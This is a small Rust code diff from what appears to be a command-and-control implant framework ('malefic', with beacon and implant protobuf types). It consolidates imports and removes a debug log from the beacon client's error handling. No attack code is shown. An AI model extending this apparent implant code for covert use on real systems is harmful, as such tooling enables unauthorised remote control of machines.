@@ -4,10 +4,7 @@ use futures::try_join;
 
 use malefic_core::collector::Collector;
 use malefic_core::scheduler::{Scheduler, TaskOperator};
-use malefic_helper::debug;
-use malefic_modules::MaleficModule;
-use malefic_proto::proto::implantpb::spite::Body;
-use malefic_proto::proto::implantpb::{Spite, Spites};
+use malefic_proto::prelude::*;
 
 pub struct Malefic {}
 pub struct MaleficChannel {
@@ -54,9 +51,10 @@ impl Malefic {
             if #[cfg(feature = "beacon")] {
                 use crate::beacon::MaleficBeacon;
                 let mut client = match MaleficBeacon::new(instance_id, channel) {
-                    Ok(client) => client,
-                    Err(e) => {
-                        debug!("[malefic] Failed to create beacon client: {}", e);
+                    Ok(client) => {
+                        client
+                    },
+                    Err(_) => {
                         return;
                     }
                 };
